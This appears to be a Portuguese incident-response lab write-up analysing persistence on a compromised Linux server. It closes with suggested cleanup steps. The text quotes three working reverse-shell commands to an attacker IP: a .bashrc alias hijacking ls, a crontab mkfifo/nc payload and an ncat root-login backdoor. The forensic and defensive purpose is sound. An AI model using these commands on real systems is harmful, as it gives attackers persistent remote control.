@@ -1,0 +1,53 @@
+Case Study: Investigação de Persistência em Servidor Linux
+
+Este relatório documenta a análise forense e identificação de mecanismos de persistência em um servidor comprometido, simulando um cenário real de Resposta a Incidentes (IR).
+
+Visão Geral
+
+O objetivo foi atuar como analista de IR para identificar 5 métodos de persistência plantados por um atacante no usuário giorgio e na conta root.
+
+
+
+Análise Técnica das Descobertas
+
+1. Manipulação de Binários e Shell (.bashrc)
+
+Foi identificado um alias malicioso no arquivo .bashrc do usuário. O atacante sequestrou o comando comum ls para executar um Reverse Shell em segundo plano sempre que o usuário listasse arquivos.
+
+
+
+Comando Identificado: ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'
+
+2. Persistência via Tarefas Agendadas (Crontab)
+
+O invasor configurou uma tarefa recorrente utilizando um Named Pipe (mkfifo) para garantir a conexão reversa persistente, dificultando a detecção por firewalls simples.
+
+
+
+Payload: /usr/bin/rm /tmp/f; /usr/bin/mkfifo /tmp/f; /usr/bin/cat /tmp/f | /bin/sh -i 2>&1 | /usr/bin/nc 172.10.6.9 6969 > /tmp/f
+
+3. Escala de Privilégios e Root Backdoor
+
+Ao realizar o login como root, o sistema executava automaticamente um binário do ncat para abrir um shell de administração remota para o IP do atacante.
+
+
+
+Comando: ncat -e /bin/bash 172.10.6.9 6969
+
+4. Persistência Nativa do Sistema
+
+O mecanismo final envolvia a manipulação de scripts nativos de inicialização/login (como o MOTD ou serviços do Systemd), onde o adversário ocultou sua última linha de defesa e uma "pepita" (dica) confirmando o controle total do sistema.
+
+Erradicação Sugerida
+
+Remoção dos aliases no .bashrc.
+
+Limpeza das tabelas do crontab -e.
+
+Auditoria e remoção de scripts maliciosos em /etc/update-motd.d/ ou /etc/profile.d/.
+
+Reset de credenciais de todos os usuários afetados.
+
+📂 Nota: O relatório detalhado com os prints das telas do terminal e a análise completa de cada artefato está disponível no arquivo PDF abaixo.
+
+Material Completo: Persistence_Investigation_Lab.pdf
